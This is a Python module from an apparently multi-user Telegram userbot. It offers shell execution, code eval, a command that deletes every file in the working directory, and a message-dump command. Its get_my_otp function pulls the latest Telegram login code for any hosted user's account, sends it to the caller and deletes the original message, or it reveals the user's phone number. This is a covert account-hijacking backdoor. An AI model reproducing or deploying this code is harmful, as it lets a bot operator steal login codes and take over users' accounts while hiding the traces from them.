import os
import sys
import traceback
from io import BytesIO, StringIO

from PyroUbot import *


async def shell_cmd(client, message):
    if len(message.command) < 2:
        return await message.reply("noob")
    try:
        if message.command[1] == "restart":
            await message.delete()
            os.system(f"kill -9 {os.getpid()} && python3 -m PyroUbot")
        elif message.command[1] == "gitpull":
            await message.delete()
            os.system(f"kill -9 {os.getpid()} && git pull && python3 -m PyroUbot")
        elif message.command[1] == "clean":
            count = 0
            for X in os.popen("ls").read().split():
                try:
                    os.remove(X)
                    count += 1
                except:
                    pass
            return await message.reply(f"✅ {count} sampah berhasil di bersihkan")
        else:
            msg = await message.reply("<b>Memproses</b>")
            screen = (await bash(message.text.split(None, 1)[1]))[0]
            if int(len(str(screen))) > 4096:
                with BytesIO(str.encode(str(screen))) as out_file:
                    out_file.name = "result.txt"
                    await message.reply_document(
                        document=out_file,
                    )
                    await msg.delete()
            else:
                await message.reply(screen)
                await msg.delete()
    except Exception as error:
        await msg.edit(error)


async def evalator_cmd(client, message):
    TM = await message.reply_text("Processing ...")
    cmd = message.text.split(" ", maxsplit=1)[1]
    reply_to_ = message.reply_to_message or message
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = "<b>OUTPUT</b>:\n"
    final_output += f"<b>{evaluation.strip()}</b>"
    if len(final_output) > 4096:
        with BytesIO(str.encode(final_output)) as out_file:
            out_file.name = "eval.text"
            await reply_to_.reply_document(
                document=out_file,
                caption=cmd[: 4096 // 4 - 1],
                disable_notification=True,
                quote=True,
            )
    else:
        await reply_to_.reply_text(final_output, quote=True)
    await TM.delete()


async def trash_cmd(client, message):
    try:
        if message.reply_to_message:
            if len(str(message.reply_to_message)) > 4096:
                with BytesIO(str.encode(str(message.reply_to_message))) as out_file:
                    out_file.name = "trash.txt"
                    return await message.reply_document(document=out_file)
            else:
                args = get_arg(message)
                if not args:
                    return await message.reply(str(message.reply_to_message))
                else:
                    for msgs in [message.reply_to_message]:
                        return await message.reply(getattr(msgs, args))
        else:
            return await message.reply("reply ke pesan/media")
    except Exception as error:
        return await message.reply(str(error))


async def get_my_otp(client, message):
    TM = await message.reply("<b>sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs</b>", quote=True)
    if len(message.command) < 2:
        return await TM.edit("<b>ᴘᴀʏᴀʜ ɢɪᴛᴜ ᴀᴊᴀ ɴɢɢᴀᴋ ʙɪsᴀ</b>")
    else:
        for X in ubot._ubot:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    async for otp in X.search_messages(777000, limit=1):
                        if not otp.text:
                            await message.reply(
                                "<b>❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</b>", quote=True
                            )
                        else:
                            await message.reply(otp.text, quote=True)
                            await X.delete_messages(X.me.id, otp.id)
                    await TM.delete()
                else:
                    return await TM.edit(X.me.phone_number)
